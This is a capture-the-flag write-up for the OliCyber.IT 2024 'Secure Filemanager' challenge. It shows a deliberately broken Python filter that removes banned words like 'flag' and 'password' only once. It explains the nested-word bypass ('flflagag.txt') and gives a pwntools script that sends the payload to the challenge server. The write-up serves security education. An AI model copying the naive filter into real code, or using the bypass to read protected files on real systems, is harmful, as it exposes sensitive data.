# OliCyber.IT 2024 - Regional CTF

## [misc] Secure Filemanager (104 solves)

Revolutionary file repositiory with sensitive file protection

```python
bannedwords = ['flag', 'secret', 'password', 'key']

# The user input is cleaned up from banned words
def cleanup(filename):
  for word in bannedwords:
    filename = filename.replace(word, '')
  return filename
```

`nc secure-filemanager.challs.external.open.ecsc2024.it 38104`

Author: Giovanni Minotti <@Giotino>

## Solution

The `cleanup` function is broken since it doesn't censor recursively. This means that if we have a nested banned word like `flflagag.txt` it will be cleaned as `flag.txt`.

## Exploit

```python
#!/usr/bin/env python3

import os
from pwn import *

logging.disable()

HOST = os.environ.get("HOST", "secure-filemanager.challs.external.open.ecsc2024.it")
PORT = int(os.environ.get("PORT", 38104))

with remote(HOST, PORT) as r:
    r.recvuntil(b'Read file: ')
    r.sendline(b'flflagag.txt')
    r.recvline()
    print(r.recvline())
```
